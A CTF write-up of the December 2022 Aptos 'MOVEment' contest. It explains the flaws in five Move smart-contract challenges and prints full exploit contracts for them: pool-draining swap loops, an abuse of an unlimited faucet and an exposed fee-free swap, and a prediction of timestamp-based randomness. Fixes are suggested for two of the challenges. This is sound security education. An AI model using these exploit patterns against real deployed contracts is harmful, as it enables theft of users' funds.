---
weight: 5
title: "CTF MOVEment with Aptos Dec 2022 Writeup"
date: 2022-12-14T17:55:28+08:00
lastmod: 2022-12-14T17:55:28+08:00
draft: false
author: "Qi Qin"
authorLink: "https://leoq7.com"
description: "Writeup for CTF MOVEment with Aptos Dec 2022"
images: []
# resources:
# - name: "featured-image"
#   src: "featured-image.jpg"


tags: ["Web3", "CTF", "Move"]
categories: ["Web3"]

twemoji: false
lightgallery: true
---

## Preface

It's been half a year since I last wrote a blog. During that time, I've learned a lot about Web3 security, including Solana and Aptos. Before learning Solana and Aptos, I had some exposure to Ethereum during my freshman year. In my opinion, Solana and Aptos not only have a significant improvement in TPS over Ethereum, but the contracts written in Rust and Move are more secure; in terms of user-friendliness, the Move language is easier to use and less error-prone than Rust and Anchor. Last weekend, I participated in the CTF MOVEment with Aptos Dec 2022 jointly organized by MoveBit, Aptos, ChainFlag and OtterSec, and scored two first-bloods and two second-bloods in the four challenges except the sanity-check, ranking first in the end. In this post, I will briefly introduce the solutions to the five challenges.

<center class="img">
    <img src="./evolution.webp" width="90%">
    <p align="center" style="font-size:12px;">Image by <a src=https://medium.com/@kklas/smart-contract-development-move-vs-rust-4d8f84754a8f>Krešimir Klas</a></p>
</center>

## Challenge 1: checkin

{{< admonition note "Challenge Info" >}}
- Source: https://github.com/movebit/ctfmovement-1
- Link: http://47.243.227.164:20000/web/
- Score: 100
{{< /admonition >}}

### Target contract

The challenge 1 is a sanity-check to let players get familiar with how to use `aptos-cli` to communicate with the private chain where the challenge contract is deployed. There is a `get_flag` function in the contract, and once it's called it will emit an `Flag` event.

### Solution

After initializing an account and invoking the `get_flag` function via `aptos-cli`, we can submit the transaction hash to the challenge website, the server will check whether this transaction triggers the `Flag` event, and if so, the server will return the flag.

```bash
aptos init --assume-yes --network custom --rest-url http://8.218.146.10:9080 --faucet-url http://8.218.146.10:9081
aptos move run --assume-yes --function-id VICTIM_ADDRESS::checkin::get_flag
```


## Challenge 2: hello move

{{< admonition note "Challenge Info" >}}
- Source: https://github.com/movebit/ctfmovement-2
- Link: http://47.243.227.164:20001/web/
- Score: 200
{{< /admonition >}}

### Target contract

The challenge 2 is a simple challenge to let players get familiar with the Move language. The contract has five functions: `init_challenge`, `hash`, `discrete_log`, `add`, `pow` and `get_flag`. The `init_challenge` function is used to initialize the challenge by sending the caller a `Challenge` object with 5 members, `balance=10`, `q1=false`, `q2=false`, `q3=false`, and an event handler. `q1`, `q2`, `q3` indicates the solving status of the 3 sub-problems in this challenge, and these status will be checked in the `get_flag` function.

#### q1: hash

`q1` will be set to true if we invoke the `hash` function and provide a `guess: vector<u8>` satisfying `len(guess)==4 && keccak256(guess+"move")=="d9ad5396ce1ed307e8fb2a90de7fd01d888c02950ef6852fbc2191d2baf58e79"`.  This can be solved by writing a simple script to brute-force all the possible guesses, and the answer is `good`.

#### q2: discrete_log

In order to set `q2` to true, we need to provide a `guess: u128` satisfying `pow(10549609011087404693, guess, 18446744073709551616) == 18164541542389285005`, which is a classic discrete logarithm problem. We can solve this with `discrete_log(18164541542389285005,Mod(10549609011087404693,18446744073709551616))` in sage, and the answer is $3123592912467026955$.

#### q3: add

The sub-problem `q3` is more interesting. Similar to other checked math implementation, the [Shl and Shr operations in Move language](https://github.com/move-language/move/blob/main/language/move-vm/runtime/src/interpreter.rs#L1945-L1952) will raise an [ARITHMETIC_ERROR](https://github.com/move-language/move/blob/main/language/move-vm/types/src/values/values_impl.rs#L1568-L1604) if the shift amount is greater than or equal to the bit width of the operand as this is an undefined behavior. And the `Shl` operations won't raise `ARITHMETIC_ERROR` if there is an overflow. So we can shift the current balance $10$ to the left by more than $8$ bits to set the balance to $0$.

### Exploit contract

```rust
module solution::solution2 {

    use std::signer;
    use std::vector;

    use ctfmovement::hello_move;

    public entry fun solve(account: &signer) {
        hello_move::init_challenge(account);
        hello_move::hash(account, vector[103,111,111,100]);
        hello_move::discrete_log(account, 3123592912467026955);
        hello_move::add(account, 3, 5);
        hello_move::add(account, 3, 5);
        hello_move::get_flag(account);
    }

}
```

## Challenge 3: swap empty

{{< admonition note "Challenge Info" >}}
- Source: https://github.com/movebit/ctfmovement-3
- Link: http://47.243.227.164:20002/web/
- Score: 200
{{< /admonition >}}

### Target contract

This target contract implements a very simple swap protocol, which allows users to swap between two tokens `Coin1` and `Coin2`. The contract has a `get_coin` function to let the user get an airdrop of $5$ `Coin1` and $5$ `Coin2`, two functions `swap_12` and `swap_21` to swap between `Coin1` and `Coin2`, and a `get_flag` function checks whether the amount of `Coin1` or `Coin2` in the reserved account is `0`.

### Vulnerability

The vulnerability is the design of the `get_amouts_out` function. This contract uses a very naive way of calculating the amount of token that can be exchanged based on the ratio of `Coin1` and `Coin2` in the reserve account. However, this design is not safe, consider the following POC:

- Attacker get $5$ `Coin1` and $5$ `Coin2` from airdrop
  User: $5$ `Coin1`, $5$ `Coin2`; Reserve: $50$ `Coin1`, $50$ `Coin2`

- Attacker swap $5$ `Coin2` to $5\cdot\frac{50}{50}=5$ `Coin1`
  User: $10$ `Coin1`, $0$ `Coin2`; Reserve: $45$ `Coin1`, $55$ `Coin2`

- Attacker swap $10$ `Coin1` to $10\cdot\frac{55}{45}=12$ `Coin2`
  User: $0$ `Coin1`, $12$ `Coin2`; Reserve: $55$ `Coin1`, $43$ `Coin2`

- Attacker swap $12$ `Coin2` to $12\cdot\frac{55}{43}=15$ `Coin1`
  User: $15$ `Coin1`, $0$ `Coin2`; Reserve: $40$ `Coin1`, $55$ `Coin2`

- ...

By repeating this process, a malicious user could drain almost all the tokens in the reserved accounts.

### Exploit contract

```rust
module solution::solution3 {

    use std::signer;
    use std::vector;

    use aptos_framework::coin::{Self, Coin};

    use ctfmovement::pool::{Self, Coin1, Coin2};

    public entry fun solve(account: &signer) {
        pool::get_coin(account);

        let coin2 = coin::withdraw<Coin2>(account, 5);
        let coin1 = pool::swap_21(&mut coin2, 5);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 10);
        let coin2 = pool::swap_12(&mut coin1, 10);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin2 = coin::withdraw<Coin2>(account, 12);
        let coin1 = pool::swap_21(&mut coin2, 12);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 15);
        let coin2 = pool::swap_12(&mut coin1, 15);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin2 = coin::withdraw<Coin2>(account, 20);
        let coin1 = pool::swap_21(&mut coin2, 20);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        let coin1 = coin::withdraw<Coin1>(account, 24);
        let coin2 = pool::swap_12(&mut coin1, 24);
        coin::deposit<Coin2>(signer::address_of(account), coin2);
        coin::deposit<Coin1>(signer::address_of(account), coin1);

        pool::get_flag(account);
    }
}
```

### Possible fix

One possible fix is to use the following formula to calculate the number of tokens that can be exchanged, to ensure that the product of the two token amounts is always constant:

```rust
public fun get_amouts_out(pool: &LiquidityPool, amount: u64, order: bool): u64 {
    let (token1, token2) = get_amounts(pool);
    if (order) {
        return (amount * token2) / (token1 + amount)
    }else {
        return (amount * token1) / (token2 + amount)
    }
}
```

## Challenge 4: simple swap

{{< admonition note "Challenge Info" >}}
- Source: https://github.com/movebit/ctfmovement-4
- Link: http://47.243.227.164:20003/web/
- Score: 300
{{< /admonition >}}

### Target contract

This contract implements a Uniswap v2 like coin swap program that allows users to swap between `TestUSDC` and `SimpleCoin` with a $0.25\%$ fee rate and a $0.1\%$ bonus if a user swaps `TestUSDC` to `SimpleCoin`. In the initialization process, the admin added $10^{10}$ `TestUSDC` and $10^{10}$ `SimpleCoin` to the pool.  The `get_flag` function will check if the user has at least $10^{10}$ `SimpleCoin`, if so, the user will get the flag.

### Vulnerability

There are two vulnerabilities in this contract.

- The first vulnerability is that there is no limit on the amount of tokens that a user can claim via airdrop. An attacker can claim a large amount of tokens and then swap them to other tokens to drain the reserve pool.
- The second vulnerability is that the `swap_exact_x_to_y_direct` and `swap_exact_y_to_x_direct` functions are incorrectly exposed to the public. An attacker can call this function to swap tokens without paying the fee.

Combining these two vulnerabilities, an attacker could first claim a large amount of `TestUSDC` and then swap an amount of `TestUSDC` equal to the current reserve pool for `SimpleCoin` each time to drain half of the reserve pool while receiving a $0.1\%$ bonus. After $n$ repetitions, the amount of `SimpleCoin` in the reserve pool will be reduced to $10^{10}\cdot\frac{1}{2^n}$.

### Exploit contract

```rust
module solution::solution4 {

    use std::signer;
    use std::vector;

    use ctfmovement::simple_coin::{Self, SimpleCoin, CoinCap, TestUSDC};
    use ctfmovement::swap::{Self, LPCoin};
    use aptos_framework::coin::{Self, BurnCapability, MintCapability, FreezeCapability, Coin};

    public entry fun solve(account: &signer) {

        simple_coin::claim_faucet(account, 1000000000000000000);
        swap::check_or_register_coin_store<SimpleCoin>(account);
        let base = 10000000000; 
        let i = 0;
        while (i < 20) {
            let tusdc = coin::withdraw<TestUSDC>(account, base);
            let (simple_coin, simple_coin_reward) = swap::swap_exact_y_to_x_direct<SimpleCoin, TestUSDC>(tusdc);
            coin::deposit<SimpleCoin>(signer::address_of(account), simple_coin);
            coin::deposit<SimpleCoin>(signer::address_of(account), simple_coin_reward);
            base = base * 2;
            i = i + 1;
        };

        simple_coin::get_flag(account);
    }
}
```

### Possible fix

- Add a limit to the airdrop amount each account can claim
- Remove the `public` visibility modifier of the `swap_exact_x_to_y_direct<X, Y>` function to make it private

## Challenge 5: move lock v2

{{< admonition note "Challenge Info" >}}
- Source: https://github.com/movebit/ctfmovement-5
- Link: http://47.243.227.164:20004/web/
- Score: 400
{{< /admonition >}}

### Target contract

This contract generate a number by using a polynomial whose coefficients are generated by a string encrypted with script hash and several pseudo-random numbers. Flag event will be emitted if the user guesses the correct number. Obviously, it is almost impossible to guess the correct number, since the number of possible guesses is $2^{128}$.

### Vulnerability

The vulnerability is that the pesudorandom number is generated with a timestamp in seconds and a counter. The counter is initialized to $0$ and will be increased by $1$ each time a random number is generated. Therefore, both the timestamp and the counter are predictable. An attacker can just reuse most of the code in the target contract to generate a same polynomial and the correct number directly. Recall that the string is encrypted by XORing script hash and a constant, we need to call the exploit contract via a script.

### Exploit contract

```rust
module solution::solution5 {

    //
    // [*] Dependencies
    //
    use aptos_framework::transaction_context;
    use aptos_framework::timestamp;
    use aptos_framework::account;
    // use aptos_framework::event;

    // use aptos_std::debug;
    
    use std::vector;
    // use std::signer;
    use std::hash;
    use std::bcs;    
    
    //
    // [*] Structures
    //
    struct Polynomial has drop {
        degree : u64,
        coefficients : vector<u8>
    }

    struct Counter has key {
        value : u64
    }

    use ctfmovement::move_lock;

    const BASE : vector<u8> = b"HoudiniWhoHoudiniMeThatsHoudiniWho";
    
    //
    // [*] Module Initialization 
    //
    fun init_module(creator: &signer) {
        move_to(creator, Counter{ value: 0 })
    }

    public entry fun solve(account: &signer): bool acquires Counter  {
        let encrypted_string : vector<u8> = encrypt_string(BASE);
        
        let res_addr : address = account::create_resource_address(&@ctfmovement, encrypted_string);

        let bys_addr : vector<u8> = bcs::to_bytes(&res_addr);

        let i = 0;
        let d = 0;
        let cof : vector<u8> = vector::empty<u8>();
        while ( i < vector::length(&bys_addr) ) {

            let n1 : u64 = gen_number() % (0xff as u64);
            let n2 : u8 = (n1 as u8);
            let tmp : u8 = *vector::borrow(&bys_addr, i);

            vector::push_back(&mut cof, n2 ^ (tmp));

            i = i + 5;
            d = d + 1;
        };

        let pol : Polynomial = constructor(d, cof);

        let x : u64 = gen_number() % 0xff;
        let result = evaluate(&mut pol, x);
        
        move_lock::unlock(account, result)
    }
    
    //
    // [*] Local functions
    //
    fun increment(): u64 acquires Counter {
        let c_ref = &mut borrow_global_mut<Counter>(@solution).value;
        *c_ref = *c_ref + 1;
        *c_ref
    }

    fun constructor( _degree : u64, _coefficients : vector<u8>) : Polynomial {
        Polynomial {
            degree : _degree,
            coefficients : _coefficients
        }
    }

    fun pow(n: u64, e: u64): u64 {
        if (e == 0) {
            1
        } else if (e == 1) {
            n
        } else {
            let p = pow(n, e / 2);
            p = p * p;
            if (e % 2 == 1) {
                p = p * n;
                p
            } else {
                p
            }
        }
    }

    fun evaluate(p : &mut Polynomial, x : u64) : u128 {
        let result : u128 = 0;
        let i : u64 = 0;

        while ( i < p.degree ) {
            result = result + (((*vector::borrow(&p.coefficients, i) as u64) * pow(x, i)) as u128);
            i = i + 1;
        };

        result
    }

    fun seed(): vector<u8> acquires Counter {
        let counter = increment();
        let counter_bytes = bcs::to_bytes(&counter);

        let timestamp: u64 = timestamp::now_seconds();
        let timestamp_bytes: vector<u8> = bcs::to_bytes(&timestamp);

        let data: vector<u8> = vector::empty<u8>();
        vector::append<u8>(&mut data, counter_bytes);
        vector::append<u8>(&mut data, timestamp_bytes);

        let hash: vector<u8> = hash::sha3_256(data);
        hash
    }

    fun get_u64(bytes: vector<u8>): u64 {
        let value = 0u64;
        let i = 0u64;
        while (i < 8) {
            value = value | ((*vector::borrow(&bytes, i) as u64) << ((8 * (7 - i)) as u8));
            i = i + 1;
        };
        return value
    }

    fun gen_number() : u64 acquires Counter {
        let _seed: vector<u8> = seed();
        get_u64(_seed)
    }

    fun encrypt_string(plaintext : vector<u8>) : vector<u8> {
        let key : vector<u8> = transaction_context::get_script_hash();
        let key_len : u64 = vector::length(&key);

        let ciphertext : vector<u8> = vector::empty<u8>();

        let i = 0;
        while ( i < vector::length(&plaintext) ) {
            vector::push_back(&mut ciphertext, *vector::borrow(&plaintext, i) ^ *vector::borrow(&key, (i % key_len)));
            i = i + 1;
        };

        ciphertext
    }
}
```